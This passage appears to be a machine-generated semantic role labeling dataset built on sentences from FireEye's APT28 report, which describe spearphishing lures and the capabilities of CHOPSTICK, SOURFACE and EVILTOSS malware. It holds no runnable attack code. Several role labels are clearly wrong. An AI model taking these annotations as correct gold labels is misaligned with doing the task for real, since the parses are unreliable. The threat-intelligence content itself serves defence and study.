{"text": "to query its C2 servers for commands using HTTP GET requests"}}, "query": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "query", "index": 7}, "ARG1": {"text": "its C2 servers for commands"}, "ARGM-ADV": {"text": "using HTTP GET requests"}}, "using": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "using", "index": 13}, "ARG1": {"text": "HTTP GET requests"}}, "GET": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "GET", "index": 15}, "ARG1": {"text": "requests"}}}, " However because we have\n     observed the name \u201cSofacy\u201d used to refer to\n     APT28 malware generally (to include the\n     SOURFACE dropper, EVILTOSS,\n     CHOPSTICK, and the credential harvester\n     OLDBAIT), we are using the name\n     SOURFACE to precisely refer to a specific\n     downloader": {"have": {"V": {"text": "have", "index": 3}}, "observed": {"ARG0": {"text": "we"}, "V": {"text": "observed", "index": 4}, "ARG1": {"text": "the name \u201c Sofacy \u201d used to refer to APT28 malware generally ( to include the SOURFACE dropper , EVILTOSS , CHOPSTICK , and the credential harvester OLDBAIT )"}}, "used": {"ARG1": {"text": "the"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "to refer to APT28 malware generally ( to include the SOURFACE dropper , EVILTOSS , CHOPSTICK , harvester OLDBAIT"}}, "refer": {"ARG0": {"text": "Sofacy \u201d"}, "V": {"text": "refer", "index": 12}, "ARG1": {"text": "to APT28 malware generally ("}, "ARGM-PRP": {"text": "to include the SOURFACE dropper , EVILTOSS , CHOPSTICK , and the credential harvester OLDBAIT )"}}, "include": {"V": {"text": "include", "index": 19}, "ARG1": {"text": "the SOURFACE dropper , EVILTOSS , CHOPSTICK , and the credential harvester OLDBAIT )"}}, "are": {"V": {"text": "are", "index": 36}}, "using": {"ARGM-DIS": {"text": "However"}, "ARGM-CAU": {"text": "because we have observed the name \u201c Sofacy \u201d used to refer to APT28 malware generally ( to include the SOURFACE dropper , EVILTOSS , CHOPSTICK , and the credential harvester OLDBAIT )"}, "ARG0": {"text": "we"}, "V": {"text": "using", "index": 37}, "ARG1": {"text": "the name SOURFACE"}, "ARG2": {"text": "to precisely refer to a specific downloader"}}, "refer_2": {"ARGM-EXT": {"text": "precisely"}, "V": {"text": "refer", "index": 43}, "ARG1": {"text": "to a specific downloader"}}}, " In late 2013, APT28 used a lure\nthat contained a letter addressing a journalist by\nhis first name and claiming to originate from a\n\u201cChief Coordinator\u201d in Reason Magazine\u2019s\n\u201cCaucasian Issues Department\u201d - a division that\ndoes not appear to exist.<fn>6</fn> (Reason Magazine is a\nUS-based magazine) The letter welcomed the\nindividual as a contributor and requested topic\nideas and identification information in order to\nestablish him at the magazine": {"used": {"ARGM-LOC": {"text": "In late 2013"}, "ARG0": {"text": "APT28"}, "V": {"text": "used", "index": 5}, "ARG1": {"text": "a lure that contained a letter addressing a journalist by his first name and claiming to originate from a \u201c Chief Coordinator \u201d in Reason Magazine \u2019s \u201c Caucasian Issues Department \u201d - a division that does not appear to exist . ( Reason Magazine is a US - based magazine ) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine"}}, "contained": {"ARG0": {"text": "a lure"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 9}, "ARG1": {"text": "a letter addressing a journalist by his first name and claiming to originate from a \u201c Chief Coordinator \u201d in Reason Magazine \u2019s \u201c Caucasian Issues Department \u201d - a division that does not appear to exist"}}, "addressing": {"ARG0": {"text": "a letter"}, "V": {"text": "addressing", "index": 12}, "ARG1": {"text": "a journalist"}, "ARGM-MNR": {"text": "by his first name"}}, "claiming": {"ARG0": {"text": "a letter"}, "V": {"text": "claiming", "index": 20}, "ARG1": {"text": "to originate from a \u201c Chief Coordinator \u201d in Reason Magazine \u2019s \u201c Caucasian Issues Department \u201d - a division that does not appear to exist"}}, "originate": {"ARG1": {"text": "a letter"}, "V": {"text": "originate", "index": 22}, "ARG2": {"text": "from a \u201c Chief Coordinator \u201d in Reason Magazine \u2019s \u201c Caucasian Issues Department \u201d - a division that does not appear to exist"}}, "does": {"V": {"text": "does", "index": 42}}, "appear": {"ARGM-NEG": {"text": "not"}, "V": {"text": "appear", "index": 44}, "ARG1": {"text": "to exist"}}, "exist": {"ARG1": {"text": "that"}, "V": {"text": "exist", "index": 46}}, "is": {"ARGM-ADV": {"text": "( Reason"}, "ARG1": {"text": "Magazine"}, "V": {"text": "is", "index": 51}, "ARG2": {"text": "a US - based magazine ) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine"}}, "based": {"ARG2": {"text": "US"}, "V": {"text": "based", "index": 55}, "ARG1": {"text": "magazine"}}, "welcomed": {"ARG0": {"text": "The letter"}, "V": {"text": "welcomed", "index": 60}, "ARG1": {"text": "the individual"}, "ARG2": {"text": "as a contributor"}}, "requested": {"V": {"text": "requested", "index": 67}, "ARG1": {"text": "topic ideas"}, "ARGM-PRP": {"text": "in order to establish him at the magazine"}}, "establish": {"V": {"text": "establish", "index": 76}, "ARG1": {"text": "him"}, "ARGM-LOC": {"text": "at the magazine"}}}, "                   \n\u2022\t    APT28 has employed RSA encryption to              \n      protect files and stolen information moved        \n      from the victim\u2019s network to the controller": {"has": {"V": {"text": "has", "index": 2}}, "employed": {"ARG0": {"text": "\u2022 APT28"}, "V": {"text": "employed", "index": 3}, "ARG1": {"text": "RSA encryption"}, "ARGM-PRP": {"text": "to protect files and stolen information moved from the victim \u2019s network to the controller"}}, "protect": {"V": {"text": "protect", "index": 7}, "ARG1": {"text": "files"}}, "stolen": {"V": {"text": "stolen", "index": 10}, "ARG1": {"text": "information moved from the victim \u2019s network to the"}}, "moved": {"ARG1": {"text": "files and stolen information"}, "V": {"text": "moved", "index": 12}, "ARGM-DIR": {"text": "from the victim \u2019s network"}, "ARG2": {"text": "to the controller"}}}, "\nThe ecosystem surrounding the SOURFACE downloader frequently\nconsists of a dropper, which installs SOURFACE": {"surrounding": {"ARG1": {"text": "The ecosystem"}, "V": {"text": "surrounding", "index": 2}, "ARG2": {"text": "the SOURFACE downloader"}}, "consists": {"ARG1": {"text": "The ecosystem surrounding the SOURFACE downloader"}, "ARGM-TMP": {"text": "frequently"}, "V": {"text": "consists", "index": 7}, "ARG2": {"text": "of a dropper , which installs SOURFACE"}}, "installs": {"ARG0": {"text": "a dropper"}, "R-ARG0": {"text": "which"}, "V": {"text": "installs", "index": 13}, "ARG1": {"text": "SOURFACE"}}}, "                                         \n                                                                                   \n                                                                                   \n                                                                                   \n                                                                                   \n\n\n\nDuring our research, we discovered that       \nAPT28 uses a backdoor developed using a      \nmodular framework": {"discovered": {"ARGM-TMP": {"text": "During our research"}, "ARG0": {"text": "we"}, "V": {"text": "discovered", "index": 5}, "ARG1": {"text": "that APT28 uses a backdoor developed using a modular framework"}}, "uses": {"ARG0": {"text": "APT28"}, "V": {"text": "uses", "index": 8}, "ARG1": {"text": "a backdoor developed"}, "ARGM-MNR": {"text": "using a modular framework"}}, "developed": {"ARGM-ADJ": {"text": "backdoor"}, "V": {"text": "developed", "index": 11}}, "using": {"ARG0": {"text": "APT28"}, "V": {"text": "using", "index": 12}, "ARG1": {"text": "a modular framework"}}}, " However, it contains more                               \n capabilities, including the ability to provide access                  \n to the file system and registry, enumerate network                     \n resources, create processes, log keystrokes, access                    \n stored credentials, and execute shellcode": {"contains": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "it"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "more capabilities , including the ability to provide access to the file system and registry , enumerate network resources , create processes , log keystrokes , access stored credentials , and execute shellcode"}}, "including": {"ARG2": {"text": "more capabilities"}, "V": {"text": "including", "index": 7}, "ARG1": {"text": "the ability to provide access to the file system and registry , enumerate network resources , create processes , log keystrokes , access stored credentials , and execute shellcode"}}, "provide": {"V": {"text": "provide", "index": 11}, "ARG1": {"text": "access to the file system and registry"}}, "create": {"V": {"text": "create", "index": 24}, "ARG1": {"text": "processes"}}, "stored": {"V": {"text": "stored", "index": 31}, "ARG1": {"text": "credentials"}}, "execute": {"V": {"text": "execute", "index": 35}, "ARG1": {"text": "shellcode"}}}, " The thread writes user activity log messages to the \u201ccheck_mes_v5555\u201d mailslot in\nplain text": {"writes": {"ARG0": {"text": "The thread"}, "V": {"text": "writes", "index": 2}, "ARG1": {"text": "user activity log messages to the \u201c check_mes_v5555 \u201d mailslot in plain text"}}, "log": {"ARG0": {"text": "user activity"}, "V": {"text": "log", "index": 5}, "ARG1": {"text": "messages"}, "ARGM-ADV": {"text": "to the \u201c check_mes_v5555 \u201d mailslot in plain text"}}}, "\n  \u2022     Several of APT28\u2019s malware samples contain counter-\n       analysis capabilities including runtime checks to\n       identify an analysis environment, obfuscated strings\n       unpacked at runtime, and the inclusion of unused\n       machine instructions to slow analysis": {"contain": {"ARG0": {"text": "\u2022/ Several of APT28 \u2019s malware samples"}, "V": {"text": "contain", "index": 7}, "ARG1": {"text": "counter- analysis capabilities including runtime checks"}, "ARGM-PRP": {"text": "to identify an analysis environment"}}, "including": {"ARG2": {"text": "counter- analysis capabilities"}, "V": {"text": "including", "index": 11}, "ARG1": {"text": "runtime checks"}, "ARGM-PRP": {"text": "to identify an analysis environment"}}, "identify": {"V": {"text": "identify", "index": 15}, "ARG1": {"text": "an analysis environment"}}, "obfuscated": {"V": {"text": "obfuscated", "index": 20}, "ARG1": {"text": "strings unpacked at runtime"}}, "slow": {"V": {"text": "slow", "index": 34}, "ARG1": {"text": "analysis"}}}, "\n\u2022    Many samples across the SOURFACE/\n     CORESHELL, CHOPSTICK, and EVILTOSS\n\n\n\n   <caption>Figure 6: Typical deployment of SOURFACE ecosystem</caption>\n\n<figure>\n\n\n                           Spearphishing Email\n\n\n\n\n                         Document with exploit\n\n\n\n\n                             Dropper malware\n\n\n\n\n                        SOURFACE downloader                                      Obtains 2nd stage              C2 Server\n\n\n\n\n                     Deploys 2nd stage droppers\n\n\n\n\n                             2nd stage implant\n</figure>\n\n\n\n<footer>20 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\nmalware families obfuscate strings that are       \ndecoded at runtime": {"obfuscate": {"ARG0": {"text": "EVILTOSS malware families"}, "V": {"text": "obfuscate", "index": 14}, "ARG1": {"text": "strings that are decoded at runtime"}}, "are": {"V": {"text": "are", "index": 17}}, "decoded": {"R-ARG1": {"text": "that"}, "V": {"text": "decoded", "index": 18}, "ARGM-TMP": {"text": "at runtime"}}}, "\n\u2022    A number of CORESHELL droppers also\n     conduct runtime checks, attempting to\n     determine if they are executing in an analysis\n     environment, and if so, they do not trigger\n     their payloads": {"conduct": {"ARG0": {"text": "\u2022 A number of CORESHELL droppers"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "conduct", "index": 7}, "ARG1": {"text": "runtime checks"}, "ARGM-PRD": {"text": "attempting to determine if they are executing in an analysis environment"}}, "attempting": {"V": {"text": "attempting", "index": 11}, "ARG1": {"text": "to determine if they are executing in an analysis environment"}}, "determine": {"V": {"text": "determine", "index": 13}, "ARG1": {"text": "if they are executing in an analysis environment"}}, "are": {"V": {"text": "are", "index": 16}}, "executing": {"ARG0": {"text": "they"}, "V": {"text": "executing", "index": 17}, "ARGM-LOC": {"text": "in an analysis environment"}}, "do": {"V": {"text": "do", "index": 28}}, "trigger": {"ARGM-ADV": {"text": "if so"}, "ARG0": {"text": "they"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "trigger", "index": 30}, "ARG1": {"text": "their payloads"}}}, "\n\nCHOPSTICK collects detailed information from the host including the Windows version, CPU\narchitecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows\nVista and above and Internet Explorer settings": {"collects": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "collects", "index": 1}, "ARG1": {"text": "detailed information"}, "ARG2": {"text": "from the host"}, "C-ARG0": {"text": "including the Windows version"}}, "including": {"ARG2": {"text": "detailed information"}, "V": {"text": "including", "index": 7}, "ARG1": {"text": "the Windows version"}}}, "\n</table>\n</section>\n\n\n<footer>34 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX D:\nCHOPSTICK</heading>\n\n\n\n\nCHOPSTICK is a backdoor that uses a modularized, object-oriented framework written in C++": {"is": {"ARG1": {"text": "CHOPSTICK"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a backdoor that uses a modularized , object - oriented framework written in C++"}}, "uses": {"ARG0": {"text": "a backdoor"}, "R-ARG0": {"text": "that"}, "V": {"text": "uses", "index": 5}, "ARG1": {"text": "a modularized , object - oriented framework written in C++"}}, "modularized": {"V": {"text": "modularized", "index": 7}}, "oriented": {"ARGM-MNR": {"text": "object"}, "V": {"text": "oriented", "index": 11}, "ARG1": {"text": "framework"}}, "written": {"ARG1": {"text": "object - oriented framework"}, "V": {"text": "written", "index": 13}, "ARGM-MNR": {"text": "in C++"}}}, " Once these characters are removed the decoded (but\nstill encrypted) text looks like this:\n<list>\n00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..\u201d..3.^@$.1.@S\n00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/\n00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5\n</list>\n\nThe first two words (\u201c72 11\u201d and \u201cfd 22\u201d) are checksums that are used to validate the message": {"are": {"V": {"text": "are", "index": 3}}, "removed": {"ARG0": {"text": "these characters"}, "V": {"text": "removed", "index": 4}, "ARG1": {"text": "the decoded"}}, "decoded": {"V": {"text": "decoded", "index": 6}, "ARG1": {"text": "("}}, "looks": {"ARGM-TMP": {"text": "Once these characters are removed the decoded ( but still"}, "ARG0": {"text": "encrypted ) text"}, "V": {"text": "looks", "index": 13}, "ARG1": {"text": "like this"}}, "are_2": {"ARGM-TMP": {"text": "Once these characters are removed"}, "ARG1": {"text": "The first two words ( \u201c 72 11 \u201d and \u201c fd 22 \u201d )"}, "V": {"text": "are", "index": 32}, "ARG2": {"text": "checksums that are used to validate the message"}}, "are_3": {"V": {"text": "are", "index": 35}}, "used": {"ARG1": {"text": "checksums"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 36}, "ARG2": {"text": "to validate the message"}}, "validate": {"ARG0": {"text": "that"}, "V": {"text": "validate", "index": 38}, "ARG1": {"text": "the message"}}}, " EVILTOSS variants may use the                         \n Simple Mail Transfer Protocol (SMTP) to send                           \n stolen data in an attachment named \u201cdetaluri": {"may": {"V": {"text": "may", "index": 2}}, "use": {"ARG0": {"text": "EVILTOSS variants"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "use", "index": 3}, "ARG1": {"text": "the Simple Mail Transfer Protocol ( SMTP )"}, "ARG2": {"text": "to send stolen data in an attachment named \u201c detaluri"}}, "send": {"ARG0": {"text": "EVILTOSS variants"}, "V": {"text": "send", "index": 13}, "ARG1": {"text": "stolen data"}, "ARGM-LOC": {"text": "in an attachment named \u201c detaluri"}}, "stolen": {"V": {"text": "stolen", "index": 14}, "ARG1": {"text": "data"}}, "named": {"ARG1": {"text": "an attachment"}, "V": {"text": "named", "index": 19}, "ARG2": {"text": "\u201c detaluri"}}}, " The lure consisted of a                                  \nweaponized Excel file that presented a decoy                                \ndocument containing a list of Georgian driver\u2019s                             \nlicense numbers": {"consisted": {"ARG1": {"text": "The lure"}, "V": {"text": "consisted", "index": 2}, "ARG2": {"text": "of a weaponized Excel file that presented a decoy document containing a list of Georgian driver \u2019s license numbers"}}, "weaponized": {"V": {"text": "weaponized", "index": 5}, "ARG1": {"text": "Excel file"}}, "presented": {"ARG0": {"text": "a weaponized Excel file"}, "R-ARG0": {"text": "that"}, "V": {"text": "presented", "index": 9}, "ARG1": {"text": "a decoy document containing a list of Georgian driver \u2019s license numbers"}}, "containing": {"ARG0": {"text": "a decoy document"}, "V": {"text": "containing", "index": 13}, "ARG1": {"text": "a list of Georgian driver \u2019s license numbers"}}}, "\n\nIn the second example of MIA targeting, an APT28\nlure used an information technology-themed decoy\ndocument that included references to the Windows\ndomain \u201cMIA Users\\Ortachala\u2026\u201d (Figure 1)": {"used": {"ARGM-LOC": {"text": "In the second example of MIA targeting"}, "ARG0": {"text": "an APT28"}, "ARGM-MNR": {"text": "lure"}, "V": {"text": "used", "index": 11}, "ARG1": {"text": "an information technology - themed decoy document that included references to the Windows domain \u201c MIA Users\\Ortachala \u2026 \u201d ( Figure 1 )"}}, "themed": {"ARG0": {"text": "technology"}, "V": {"text": "themed", "index": 16}, "ARG1": {"text": "decoy document"}}, "included": {"ARG2": {"text": "an information technology - themed decoy document"}, "R-ARG2": {"text": "that"}, "V": {"text": "included", "index": 20}, "ARG1": {"text": "references to the Windows domain \u201c MIA Users\\Ortachala \u2026 \u201d ( Figure 1 )"}}}, " Credentials for the following applications are collected:\n<list>\n\u2022\t     Internet Explorer\n\u2022\t     Mozilla Firefox\n\u2022\t     Eudora\n\u2022\t     The Bat! (an email client made by a Moldovan company)\n\u2022\t     Becky! (an email client made by a Japanese company)\n</list>\nBoth email and HTTP can be used to send out the collected credentials": {"following": {"V": {"text": "following", "index": 3}, "ARG1": {"text": "applications"}}, "are": {"V": {"text": "are", "index": 5}}, "collected": {"ARG1": {"text": "Credentials for the following applications"}, "V": {"text": "collected", "index": 6}}, "can": {"V": {"text": "can", "index": 12}}, "be": {"V": {"text": "be", "index": 13}}, "used": {"ARG1": {"text": "Both email and HTTP"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 14}, "ARG2": {"text": "to send out the collected credentials"}}, "send": {"V": {"text": "send", "index": 16}, "ARG1": {"text": "the collected credentials"}}, "collected_2": {"V": {"text": "collected", "index": 19}, "ARG1": {"text": "credentials"}}}, " The malware contains code which allows it to load or memory-map external modules\nthat export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp,\nIsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage,\nand TakeMessage": {"contains": {"ARG0": {"text": "The malware"}, "V": {"text": "contains", "index": 2}, "ARG1": {"text": "code which allows it to load or memory - map external modules that export the following functions : SendRawPacket , GetRawPacket , InitializeExp , DestroyExp , IsActiveChannel , GetChannelInfo , SetChannelInfo , Run , GetModuleInfo , GiveMessage , and TakeMessage"}}, "allows": {"ARG0": {"text": "code"}, "R-ARG0": {"text": "which"}, "V": {"text": "allows", "index": 5}, "ARG1": {"text": "it to load or memory - map external modules that export the following functions : SendRawPacket , GetRawPacket , InitializeExp , DestroyExp , IsActiveChannel , GetChannelInfo , SetChannelInfo , Run , GetModuleInfo , GiveMessage , and TakeMessage"}}, "load": {"ARG0": {"text": "it"}, "V": {"text": "load", "index": 8}, "ARG2": {"text": "modules"}, "ARG1": {"text": "that export the following functions"}}, "export": {"ARG0": {"text": "load or memory - map external modules"}, "R-ARG0": {"text": "that"}, "V": {"text": "export", "index": 16}, "ARG1": {"text": "the following functions"}}, "following": {"V": {"text": "following", "index": 18}, "ARG1": {"text": "functions"}}}, " In September       \n2014, APT28 registered a domain (smigroup-            \nonline.co[.]uk) that appeared to mimic that for the   \nSMi Group, a company that plans events for the\n\u201cDefence, Security, Energy, Utilities, Finance and\nPharmaceutical sectors.\u201d Among other events, the\nSMi Group is currently planning a military satellite\ncommunications event for November 2014": {"registered": {"ARGM-TMP": {"text": "In September 2014"}, "ARG0": {"text": "APT28"}, "V": {"text": "registered", "index": 5}, "ARG1": {"text": "a domain ( smigroup- online.co[.]uk ) that appeared to mimic that for the SMi Group"}}, "appeared": {"V": {"text": "appeared", "index": 13}, "ARG1": {"text": "to mimic that for the SMi"}}, "mimic": {"ARG0": {"text": "that"}, "V": {"text": "mimic", "index": 15}, "ARG1": {"text": "that for the SMi Group"}}, "plans": {"ARG0": {"text": "a company"}, "R-ARG0": {"text": "that"}, "V": {"text": "plans", "index": 25}, "ARG1": {"text": "events for the \u201c Defence , Security , Energy , Utilities , Finance and Pharmaceutical sectors"}}, "is": {"V": {"text": "is", "index": 51}}, "planning": {"ARGM-ADV": {"text": "plans events for the \u201c Defence , Security , Energy , Utilities , Finance and Pharmaceutical sectors ./ \u201d Among other events"}, "ARG0": {"text": "the SMi Group"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "planning", "index": 53}, "ARG1": {"text": "a military satellite communications event for November 2014"}}}, "\n\n\n\n<caption>\n   Figure 4: Decoy\n   document used\n   against military\n   attaches in 2012\n</caption>\n\n<figure></figure>\n\n\nFinally, APT28 used a lure that contained an apparent\nnon-public listing of contact information for defense\nattach\u00e9s in the \u201cAnkara Military Attach\u00e9 Corps (AMAC),\u201d\nwhich appears to be a professional organization of\ndefense attach\u00e9s in Turkey": {"used": {"ARGM-DIS": {"text": "Finally"}, "ARG0": {"text": "APT28"}, "V": {"text": "used", "index": 3}, "ARG1": {"text": "a lure that contained an apparent non - public listing of contact information for defense attach\u00e9s in the \u201c Ankara Military Attach\u00e9 Corps ( AMAC ) , \u201d which appears to be a professional organization of defense attach\u00e9s in Turkey"}}, "contained": {"ARG0": {"text": "a lure"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 7}, "ARG1": {"text": "an apparent non - public listing of contact information for defense attach\u00e9s in the \u201c Ankara Military Attach\u00e9 Corps ( AMAC ) , \u201d which appears to be a professional organization of defense attach\u00e9s in Turkey"}}, "appears": {"V": {"text": "appears", "index": 33}, "ARG1": {"text": "to be a professional organization of defense attach\u00e9s in Turkey"}}, "be": {"ARG1": {"text": "which"}, "V": {"text": "be", "index": 35}, "ARG2": {"text": "a professional organization of defense attach\u00e9s in Turkey"}}}, " The purpose of this parameter\nappears to be to uniquely identify the particular instance of the backdoor to the C2 server": {"appears": {"ARG1": {"text": "The purpose of this parameter"}, "V": {"text": "appears", "index": 5}, "C-ARG1": {"text": "to be to uniquely identify the particular instance of the backdoor to the C2 server"}}, "be": {"ARG1": {"text": "The purpose of this parameter"}, "V": {"text": "be", "index": 7}, "ARG2": {"text": "to uniquely identify the particular instance of the backdoor to the C2 server"}}, "identify": {"ARGM-MNR": {"text": "uniquely"}, "V": {"text": "identify", "index": 10}, "ARG1": {"text": "the particular instance of the backdoor to the C2 server"}}}, "\nCHOPSTICK may communicate with external servers using SMTP or HTTP": {"may": {"V": {"text": "may", "index": 1}}, "communicate": {"ARG0": {"text": "CHOPSTICK"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "communicate", "index": 2}, "ARG2": {"text": "with external servers"}, "ARGM-ADV": {"text": "using SMTP or HTTP"}}, "using": {"V": {"text": "using", "index": 6}, "ARG1": {"text": "SMTP or HTTP"}}}, "\n\n<heading>APT28 Targeting a Journalist Covering\nthe Caucasus</heading>\n\nAnother one of APT28\u2019s lures appeared to target\na specific journalist covering issues in the\nCaucasus region": {"appeared": {"ARG1": {"text": "Another one of APT28 \u2019s lures"}, "V": {"text": "appeared", "index": 6}, "C-ARG1": {"text": "to target a specific journalist covering issues in the Caucasus region"}}, "target": {"ARG0": {"text": "Another one of APT28 \u2019s lures"}, "V": {"text": "target", "index": 8}, "ARG1": {"text": "a specific journalist covering issues in the Caucasus region"}}, "covering": {"ARG2": {"text": "a specific journalist"}, "V": {"text": "covering", "index": 12}, "ARG1": {"text": "issues"}, "ARGM-LOC": {"text": "in the Caucasus region"}}}, " We have also noted that         \nAPT28 tailors implants to their target               \nenvironments, configuring them to use local          \nnetwork resources such as email servers": {"have": {"V": {"text": "have", "index": 1}}, "noted": {"ARG0": {"text": "We"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "noted", "index": 3}, "ARG1": {"text": "that APT28 tailors implants to their target environments , configuring them to use local network resources such as email servers"}}, "tailors": {"ARG0": {"text": "APT28"}, "V": {"text": "tailors", "index": 6}, "ARG1": {"text": "implants"}, "ARG2": {"text": "to their target environments"}, "ARGM-PRD": {"text": "configuring them to use local network resources such as email servers"}}, "configuring": {"ARG0": {"text": "APT28 tailors implants"}, "V": {"text": "configuring", "index": 13}, "ARG1": {"text": "them"}, "ARGM-PRP": {"text": "to use local network resources such as email servers"}}, "use": {"V": {"text": "use", "index": 16}, "ARG1": {"text": "local network resources such as email servers"}}}, " They may not share the\nsame code structure, but they are related because one drops and installs\nthe other": {"may": {"V": {"text": "may", "index": 1}}, "share": {"ARG0": {"text": "They"}, "ARGM-MOD": {"text": "may"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "share", "index": 3}, "ARG1": {"text": "the same code structure"}}, "are": {"ARG1": {"text": "they"}, "V": {"text": "are", "index": 11}, "ARG2": {"text": "related"}, "ARGM-CAU": {"text": "because one drops and installs the other"}}, "related": {"ARG1": {"text": "they"}, "V": {"text": "related", "index": 12}, "ARGM-CAU": {"text": "because one drops and installs the other"}}, "installs": {"ARG0": {"text": "one"}, "V": {"text": "installs", "index": 17}, "ARG1": {"text": "the other"}}}, "    Email sent through a specified mail server": {"sent": {"ARG0": {"text": "Email"}, "V": {"text": "sent", "index": 1}, "ARGM-MNR": {"text": "through a specified mail server"}}, "specified": {"V": {"text": "specified", "index": 4}, "ARG1": {"text": "mail server"}}}, " Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file": {"are": {"ARG1": {"text": "the contents of edg6EF885E2.tmp"}, "V": {"text": "are", "index": 5}, "ARG2": {"text": "uploaded"}}, "uploaded": {"ARG1": {"text": "the contents of edg6EF885E2.tmp"}, "V": {"text": "uploaded", "index": 6}}, "deletes": {"ARGM-TMP": {"text": "Once the contents of edg6EF885E2.tmp are uploaded"}, "ARG0": {"text": "CHOPSTICK"}, "V": {"text": "deletes", "index": 9}, "ARG1": {"text": "the file"}}}, " Once connected to the\nmail server, APT28\u2019s backdoor sent an email\nmessage using a subject line related to driver\u2019s\nlicenses (in Georgian), and attached a file\ncontaining system reconnaissance information": {"connected": {"V": {"text": "connected", "index": 1}, "ARG2": {"text": "to the mail server"}, "ARG1": {"text": "APT28 \u2019s"}}, "sent": {"ARGM-TMP": {"text": "Once connected to the mail server"}, "ARG0": {"text": "APT28 \u2019s backdoor"}, "V": {"text": "sent", "index": 10}, "ARG1": {"text": "an email message"}, "ARGM-MNR": {"text": "using a subject line related to driver \u2019s licenses ( in Georgian )"}}, "using": {"V": {"text": "using", "index": 14}, "ARG1": {"text": "a subject line related to driver \u2019s licenses ( in Georgian )"}}, "related": {"ARG1": {"text": "a subject line"}, "V": {"text": "related", "index": 18}, "ARG2": {"text": "to driver \u2019s licenses ( in Georgian )"}}, "driver": {"V": {"text": "driver", "index": 20}, "ARG1": {"text": "\u2019s licenses ("}, "ARG2": {"text": "in Georgian )"}}, "attached": {"ARGM-TMP": {"text": "Once connected to the mail server"}, "ARG0": {"text": "APT28 \u2019s backdoor"}, "V": {"text": "attached", "index": 29}, "ARG1": {"text": "a file containing system reconnaissance information"}}, "containing": {"ARG0": {"text": "a file"}, "V": {"text": "containing", "index": 32}, "ARG1": {"text": "system reconnaissance information"}}}, " In one sample this\n      information was intended to be sent via\n      SMTP using a Georgian MIA mail server": {"was": {"V": {"text": "was", "index": 5}}, "intended": {"ARGM-LOC": {"text": "In one sample"}, "V": {"text": "intended", "index": 6}, "ARG1": {"text": "to be sent via SMTP using a Georgian MIA mail server"}}, "be": {"V": {"text": "be", "index": 8}}, "sent": {"ARG1": {"text": "this information"}, "V": {"text": "sent", "index": 9}, "ARGM-MNR": {"text": "via SMTP using a Georgian MIA mail server"}}, "using": {"V": {"text": "using", "index": 12}, "ARG1": {"text": "a Georgian MIA mail server"}}}, " In one case, we identified an                               \nAPT28 lure from mid-2013 that referenced                                    \nMIA-related topics and employed malware that                                \nattempted to disguise its activity as legitimate                            \nMIA email traffic": {"identified": {"ARGM-DIS": {"text": "In one case"}, "ARG0": {"text": "we"}, "V": {"text": "identified", "index": 5}, "ARG1": {"text": "an APT28 lure from mid-2013 that referenced MIA - related topics and employed malware that attempted to disguise its activity as legitimate MIA email traffic"}}, "referenced": {"ARG0": {"text": "mid-2013"}, "R-ARG0": {"text": "that"}, "V": {"text": "referenced", "index": 12}, "ARG1": {"text": "MIA - related topics"}}, "related": {"ARG2": {"text": "MIA"}, "V": {"text": "related", "index": 15}, "ARG1": {"text": "topics"}}, "employed": {"ARG0": {"text": "mid-2013"}, "R-ARG0": {"text": "that"}, "V": {"text": "employed", "index": 18}, "ARG1": {"text": "malware that attempted to disguise its activity as legitimate MIA email traffic"}}, "attempted": {"ARG0": {"text": "malware"}, "R-ARG0": {"text": "that"}, "V": {"text": "attempted", "index": 21}, "ARG1": {"text": "to disguise its activity as legitimate MIA email traffic"}}, "disguise": {"ARG0": {"text": "that"}, "V": {"text": "disguise", "index": 23}, "ARG1": {"text": "its activity"}, "ARGM-PRD": {"text": "as legitimate MIA email traffic"}}}, " Commands from the controller to the\nCORESHELL implant are encrypted using another\nstream cipher but this time using an eight-byte\nkey": {"are": {"V": {"text": "are", "index": 8}}, "encrypted": {"ARG1": {"text": "Commands from the controller to the CORESHELL implant"}, "V": {"text": "encrypted", "index": 9}, "ARGM-MNR": {"text": "using another stream cipher"}}, "using": {"V": {"text": "using", "index": 10}, "ARG1": {"text": "another stream cipher"}}, "using_2": {"ARGM-TMP": {"text": "this time"}, "V": {"text": "using", "index": 17}, "ARG1": {"text": "an eight - byte key"}}}, " Both the internal strings and logic are obfuscated and are\nunpacked at startup": {"are": {"ARG1": {"text": "Both the internal strings and logic"}, "V": {"text": "are", "index": 6}, "ARG2": {"text": "obfuscated"}}, "obfuscated": {"ARG1": {"text": "Both the internal strings and logic"}, "V": {"text": "obfuscated", "index": 7}}, "are_2": {"ARG1": {"text": "Both the internal strings and logic"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "unpacked"}, "ARGM-LOC": {"text": "at startup"}}}, 